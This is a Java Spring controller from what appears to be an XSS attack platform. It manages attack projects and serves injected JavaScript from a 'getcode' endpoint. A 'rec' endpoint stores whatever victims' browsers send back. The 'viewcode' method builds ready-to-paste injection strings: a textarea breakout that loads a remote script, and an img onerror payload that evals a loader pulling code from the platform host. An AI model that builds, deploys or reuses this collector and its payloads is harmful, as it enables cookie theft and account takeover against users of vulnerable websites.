package controllers;

import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.validation.Valid;

import model.Content;
import model.Module;
import model.Project;
import model.User;

import org.codehaus.jackson.map.ObjectMapper;
import org.springframework.stereotype.Controller;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import services.ContentService;
import services.ModuleService;
import services.ProjectService;
import vo.ContentVo;

@Controller
@RequestMapping("project")
public class ProjectController
{
	@Resource(name="projectService")
	private ProjectService ps;
	@Resource(name="moduleService")
	private ModuleService ms;
	@Resource(name="contentService")
	private ContentService cs;
	
	@RequestMapping(value="",method=RequestMethod.GET)
	public String projectIndex(HttpServletRequest req)
	{
		List<Project> pro=getModuleList(req);
		req.setAttribute("prolist", pro);
		return "project";
	}
	@RequestMapping(value="add",method=RequestMethod.GET)
	public String projectAdd(HttpServletRequest req)
	{
		Project p=new Project();
		req.setAttribute("project",p);

		String u_name=(String) req.getSession().getAttribute("uname");
		List<Module> modules=ms.getModuleDetailList	(new User(u_name),true);
				
		Map<String,Object> needmkeys=new HashMap<String,Object>();
	
		//以逗号 相隔参数名
				Module m;		
				for (int i=0;i<modules.size();i++) {
					m=modules.get(i);
					if(m.getM_reckeys()!=null&&!m.getM_reckeys().equals(""))
						m.setM_reckeys(m.getM_setkeys().replaceAll("[^0-9a-zA-Z,]", ""));
					if(m.getM_setkeys()!=null&&!m.getM_setkeys().equals(""))
						needmkeys.put(m.getM_id()+"",m.getM_setkeys().replaceAll("[^0-9a-zA-Z,]", ""));
				}
				//初始化用来放哪些模块需要设置参数以及参数名
				ObjectMapper objectMapper = new ObjectMapper();  
				try {	
					p.setP_modulesetkeys(objectMapper.writeValueAsString(needmkeys));
				} catch (Exception e) {
					e.printStackTrace();
				} 
		req.setAttribute("modules", modules);
		
		return "projectAdd";
	}
	@RequestMapping(value="add",method=RequestMethod.POST)
	public String projectAddPost(@Valid @ModelAttribute("project")Project p,BindingResult br,HttpServletRequest req)
	{
		//at least a moduel or some define code
		String[] checkms=(String[]) req.getParameterValues("checkmodule");
		if(checkms!=null&&checkms.length==0&&p.getP_code().trim().equals(""))
			req.setAttribute("msg","至少一个模块或填写自己义代码");
		
		 p=ps.insertProject(p,req,checkms);
		 return "redirect:/project/add "; 
	}
	@RequestMapping(value="{pId}/delete",method=RequestMethod.GET)
	public String projectDelete(@PathVariable Integer pId,HttpServletRequest req)
	{
		boolean flag=false;

		int u_id=(Integer) req.getSession().getAttribute("u_id");

		flag=ps.deleteProjectById(u_id, pId);
		if(flag)
		{
			req.setAttribute("msg","项目删除成功");
		}else{
			req.setAttribute("msg","项目删除失败");
		}
		 return "redirect:/project";
	}
	@RequestMapping(value="{pId}/detail",method=RequestMethod.GET)
	public String projectDetail(@PathVariable Integer pId,@RequestParam(required=false) Integer page,HttpServletRequest req)
	{
		int u_id=(Integer) req.getSession().getAttribute("u_id");
		Project p=ps.showProjectDetail(u_id, pId);
		if(p==null)
		{
			req.setAttribute("msg","无权查看");
			return "redirect:/project";
		}else
		{
			if(page==null)
				page=1;
			int pagenum=10;
			
			List<ContentVo> contents=cs.getContentsByProject(p, page, pagenum);
			req.setAttribute("project",p);
			req.setAttribute("contents", contents);
			//get use set to get unique domain from contents
			HashSet<String> domains=new HashSet<String>();
			for(ContentVo c:contents)
				domains.add(c.getDomain());
			req.setAttribute("domains", domains);
		}
		return "projectdetail";
	}
	@RequestMapping(value="{authcode}/getcode",method=RequestMethod.GET, produces = "application/json; charset=utf-8")
	@ResponseBody
	public String getXssCode(@PathVariable String authcode,HttpServletRequest req)
	{
		Project p=ps.getProjectByCode(authcode);
		String allcode=ps.getProjectCode(p);
		return allcode;
	}
	
	//参数接收
	@RequestMapping(value="{authcode}/rec")
	@ResponseBody
	public String recXssP(@PathVariable String authcode,HttpServletRequest req)
	{
		Project p=ps.getProjectByCode(authcode);
		cs.saveContent(p, req);
		return "";
	}
	@RequestMapping(value="{pId}/viewcode",method=RequestMethod.GET)
	public String projectCode(@PathVariable Integer pId,HttpServletRequest req){
		int u_id=(Integer) req.getSession().getAttribute("u_id");
		Project p=ps.showProjectDetail(u_id,pId);
		String allcode=ps.getProjectCode(p);
		allcode=dofilter(allcode);
		String path = req.getContextPath();
		String basePath = req.getScheme()+"://"+req.getServerName()+":"+req.getServerPort()+path+"/";
		String codeshow1="</textarea>'\"><script src="+basePath+p.getP_urlkey()+"?"+new Date().getTime();
		String code2="var b=document.createElement(\"script\");b.src="+basePath+p.getP_urlkey()+"?"+new Date().getTime()+"(document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(b);";
		String codeshow2="</textarea>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/"+code2+"/.source));//>";
		codeshow1=dofilter(codeshow1);
		codeshow2=dofilter(codeshow2);
		req.setAttribute("codeshow1",codeshow1);
		req.setAttribute("codeshow2",codeshow2);
		req.setAttribute("allcode", allcode);
		req.setAttribute("p", p);
		return "projectcode";
	}
	
	public List<Project> getModuleList(HttpServletRequest req)
	{
		User u=new User();
		u.setU_name((String)req.getSession().getAttribute("uname"));
		List<Project> projects=ps.projectIndex(u);
		return projects;
	}
	// replace {projectId} and module paramaters
	public String dofilter(String code)
	{
		code=code.replaceAll("<","&lt;");
		code=code.replaceAll(">","&gt;");
		//code=code.replaceAll("&","&amp;");
		code=code.replaceAll("\"","&quot;");
		return code;
	}
}